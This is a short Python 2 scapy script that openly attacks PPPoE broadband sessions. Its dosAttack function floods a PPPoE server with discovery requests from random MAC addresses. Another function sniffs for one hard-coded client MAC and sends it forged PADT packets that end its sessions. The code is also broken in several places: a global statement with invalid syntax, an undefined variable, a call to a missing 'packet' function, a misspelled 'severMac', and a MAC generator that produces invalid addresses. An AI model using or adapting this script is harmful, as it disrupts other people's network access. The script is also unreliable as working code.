from scapy.all import *
import random
import exceptions

'''
srp1             : Send and receive packets at layer 2 and return only the first answer
sniff            : Sniff packets
sendp            : Send packets at layer 2
'''

global broadcast = "ff:ff:ff:ff:ff:ff"

def randMac():
    return ":".join([str(random.randint(10, 99)) for i in range(6)])

def composePacket(src, dst, code, sessionid=0, len=16):
    packet = Ether() / PPPoE()
    packet.src = src
    packet.dst = dst
    packet.type = 0x8863
    packet.payload.version = 1
    packet.payload.type = 1
    packet.payload.code = code
    packet.payload.sessionid = sessionid
    packet.payload.len = len
    return packet

def sendPADI(serverMac, clientMac):
    while True:
        try:
            packet = sniff(count=1)
	    if packet[0].dst == "ff:ff:ff:ff:ff:ff" and packet[0].src == "8d:dc:aa:67:1f:11":
                sendp(composePacket(src=serverMac, dst=b[0].src, code=0xa7, sessionid=range(65535), len=0))
        except Exception, e:
            print e
            break

def dosAttack(broadcast, serverMac):
    while True:
        try:
            c = randMac()
            sendp(packet(src=c, dst=broadcast, code=0x09))
            sendp(packet(src=c, dst=serverMac, code=0x19))
        except Exception, e:
            print e
            break


echoPacket = srp1(packet(src=randMac(), dst=broadcast, code=0x09, len=0))
serverMac = echoPacket.src

sendPADI(severMac, "8d:dc:aa:67:1f:11")
